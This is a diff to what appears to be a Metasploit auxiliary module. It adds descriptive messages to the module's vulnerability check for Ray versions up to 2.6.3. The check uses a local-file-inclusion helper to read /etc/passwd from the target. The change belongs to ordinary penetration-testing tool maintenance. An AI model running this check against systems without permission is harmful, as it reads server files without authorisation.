@@ -49,18 +49,18 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api/version')
     })
-    return Exploit::CheckCode::Unknown unless res && res.code == 200
+    return Exploit::CheckCode::Unknown('No response or unexpected status from Ray API') unless res && res.code == 200
 
     ray_version = res.get_json_document['ray_version']
 
-    return Exploit::CheckCode::Unknown unless ray_version
+    return Exploit::CheckCode::Unknown('Could not determine Ray version') unless ray_version
 
-    return Exploit::CheckCode::Safe unless Rex::Version.new(ray_version) <= Rex::Version.new('2.6.3')
+    return Exploit::CheckCode::Safe("Ray version #{ray_version} is not vulnerable") unless Rex::Version.new(ray_version) <= Rex::Version.new('2.6.3')
 
     file_content = lfi('/etc/passwd')
-    return Exploit::CheckCode::Vulnerable unless file_content.nil?
+    return Exploit::CheckCode::Vulnerable("Ray #{ray_version} - successfully read /etc/passwd") unless file_content.nil?
 
-    Exploit::CheckCode::Appears
+    Exploit::CheckCode::Appears("Ray version #{ray_version} is in the vulnerable range")
   end
 
   def lfi(filepath)
